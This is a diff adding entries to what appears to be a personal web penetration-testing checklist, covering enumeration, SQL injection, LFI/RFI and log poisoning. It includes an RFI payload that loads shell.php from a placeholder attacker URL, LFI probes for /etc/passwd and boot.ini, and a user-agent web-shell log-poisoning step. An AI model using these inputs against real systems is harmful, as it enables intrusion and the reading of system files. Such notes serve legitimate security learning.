@@ -23,3 +23,84 @@ layout: default
     <li>feroxbuster</li>
     <li>Check error page (go to random  url)</li>
 </ul>
+
+<li>Look for exploits</li>
+<ul>
+    <li>Carefully look at different web app name variations (cutenews & cutephp)</li>
+    <li>Search exploits for website names even if they look "custom" or meaningless</li>
+</ul>
+
+<li>Read all web pages</li>
+<ul>
+    <li>Look for usernames</li>
+    <li>Look at source code for all pages</li>
+    <ul>
+        <li>Hidden functions</li>
+        <li>Comments with sensitive information</li>
+    </ul>
+</ul>
+
+<li>Burp</li>
+<ul>
+    <li>Inspect web page requests</li>
+    <ul>
+        <li>Hidden directories may be revealed</li>
+        <ul>
+            <li>GET request on /hello-world/ initiated a bunch of other GET requests behind the scenes and this revealed hidden web directories </li>
+        </ul>
+        <li>Interesting headers may be revealed</li>
+    </ul>
+</ul>
+
+<li>Nikto</li>
+<ul>
+    <li>Quick and easy web app vulnerability scanner</li>
+</ul>
+
+<li>sql injection</li>
+<ul>
+    <li>Test *all* input forms</li>
+    <li>&lt;url&gt;.com/id=&lt;Test for sql injection&gt;</li>
+</ul>
+
+<li>Input Forms</li>
+<ul>
+    <li>Test for LFI and RFI</li>
+    <li>Play with input lengths</li>
+</ul>
+
+<li>Directory Traversal</li>
+<ul>
+    <li>Look for links such as: www.website.com/something.php?page=mkdocs</li>
+    <ul>
+        <li>RFI</li>
+        <ul>
+            <li>page=http://&lt;attacker url&gt;/shell.php</li>
+        </ul>
+        <li>LFI</li>
+        <ul>
+            <li>?file=&lt;directory&gt;</li>
+            <ul>
+                <li>try to change it to file=/etc/passwd or file=C:\boot.ini</li>
+            </ul>
+            <li>Log poisoning</li>
+            <ul>
+                <li>LFI and code execution combo</li>
+            </ul>
+        </ul>
+    </ul>
+</ul>
+
+<li>Log poisoning</li>
+<ul>
+    <li>Check for &lt;log&gt;.php/asp/aspx</li>
+    <ul>
+        <li>If logs are keeping track of HTTP request user-agents then set user-agent to web shell code and then navigate to the log using LFI</li>
+    </ul>
+</ul>
+
+<li>Check github page for web application</li>
+<ul>
+    <li>Look for issues which may reveal vulnerabilities or exploits</li>
+    <li>Look at file in web app directory, might be able to find something interesting to look for on the victim</li>
+</ul>
